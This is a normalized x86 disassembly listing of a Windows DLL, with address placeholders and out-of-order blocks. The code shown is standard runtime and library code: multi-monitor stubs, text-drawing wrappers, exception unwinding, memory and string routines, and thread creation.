push [ esp + 0x10 ]
call [ rw-data ]
jmp r-xdata
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_10006e18
push ebp
mov ebp esp
sub esp 0x2c
call sub_10006cea
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10006dc2
jmp r-xdata
test eax eax
je r-xdata
sub_10006e83
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_10006cea
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx ] 0x48
push 0x1
movsd [ edi ] [ esi ]
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
add ebx 0x28
push r--data
push ebx
call [ lstrcpyA@IAT ]
sub_10006f71
mov eax sub_1001a6ce
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_100180d9
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_100140f6
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call sub_100140f6
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_1000711d
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_10007142
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_10007196
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_100071e2
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_10007224
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10007273
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a921
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_100072a9
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_100072fd
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1000b140
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_100072fd
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a921
add esp 0x20
pop ebp
retn
sub_10007322
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_100073d8
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_1000b211
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_100073d8
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a921
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10007224
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000744d
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_1000b379
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_1000b379
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_100074c8
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000750a
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_100074e8
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000759e
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_100075b6
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
cmp [ rw-data ] esi
push edi
mov [ ebp - 0x8 ] esi
jne r-xdata
mov edi rw-data
push edi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x4 ] esi
push edi
call [ InterlockedDecrement@IAT ]
push 0x13
call sub_1000b7a4
pop ecx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
pop edi
pop esi
leave
retn
mov cl [ edx ]
cmp cl 0x61
jl r-xdata
push ebx
push 0x1
push esi
push esi
push esi
push 0xffffffff
push [ ebp + 0x8 ]
mov esi 0x200
push esi
push eax
call sub_1000b4c0
mov ebx eax
add esp 0x20
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
cmp cl 0x7a
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
pop ebx
je r-xdata
push ebx
call sub_10008cba
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
push 0x13
call sub_1000b805
pop ecx
jmp r-xdata
jmp r-xdata
sub cl 0x20
mov [ edx ] cl
push edi
call [ InterlockedDecrement@IAT ]
push 0x13
call sub_1000b805
pop ecx
jmp r-xdata
push 0x1
push 0x0
push ebx
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push esi
push [ rw-data ]
call sub_1000b4c0
add esp 0x20
test eax eax
je r-xdata
mov cl [ edx ]
cmp cl 0x61
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
cmp [ eax ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call sub_10008d46
mov eax [ ebp + 0x8 ]
pop ecx
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1000b3d0
pop ecx
pop ecx
inc edx
cmp [ edx ] 0x0
jne r-xdata
cmp cl 0x7a
jg r-xdata
jmp r-xdata
sub cl 0x20
mov [ edx ] cl
sub_100076ea
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_1000b932
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000b81a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_10007740
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1000775f
push ebx
push esi
mov esi rw-data
push edi
push esi
push 0x1
call sub_10008913
push esi
call sub_1000c13c
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_1000b932
push esi
push edi
mov ebx eax
call sub_1000c1c9
push esi
push 0x1
call sub_10008965
add esp 0x28
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_100077a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10007800 ]
jmp [ ecx * 4 + jump_table_1000787c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100078e8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100078e8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_10007a80 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10007988 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007a80 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100078e8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100078e8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100078e8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10007a80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007a80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007a80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007a80 ]
sub_10007ad5
push esi
call sub_1000a8f5
push [ rw-data ]
call sub_1000a6bc
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_1000a6bc
add eax 0x10
push eax
push [ rw-data ]
call sub_1000c1f3
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_1000a8fe
mov eax esi
pop esi
retn
sub_10007b65
push 0x80
call sub_10008cba
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_10008c87
mov eax [ rw-data ]
pop ecx
sub_10007b94
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_10007bc0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_10007cc0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10007d40
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10007d6f
push esi
push edi
push 0x74
push 0x1
xor edi edi
call sub_1000c32b
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
call sub_10008d46
test edi edi
pop ecx
je r-xdata
push esi
call sub_1000b1fe
mov eax [ esp + 0x10 ]
pop ecx
push esi
push 0x4
push esi
push sub_10007de6
push [ esp + 0x20 ]
mov [ esi + 0x48 ] eax
mov eax [ esp + 0x28 ]
push edi
mov [ esi + 0x4c ] eax
call [ CreateThread@IAT ]
mov edi eax
test edi edi
mov [ esi + 0x4 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_1000a55c
pop ecx
call [ GetLastError@IAT ]
mov edi eax
push edi
call [ ResumeThread@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
retn
mov eax edi
sub_10007de6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x10
call sub_10008c87
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x4c ]
call [ esi + 0x48 ]
pop ecx
call sub_10007e79
call eax
sub_10007e79
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
call sub_1000b211
mov esi eax
test esi esi
jne r-xdata
call eax
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push 0x10
call sub_10008c87
pop ecx
push esi
call sub_1000b278
pop ecx
push 0x0
call [ ExitThread@IAT ]
push eax
call [ CloseHandle@IAT ]
sub_10007eb8
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_100088e4
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10007ee7
push [ ebp + 0x14 ]
mov esi eax
call sub_10008936
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_10007ee7
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_1000c530
cmp eax 0xffffffff
pop ecx
je r-xdata
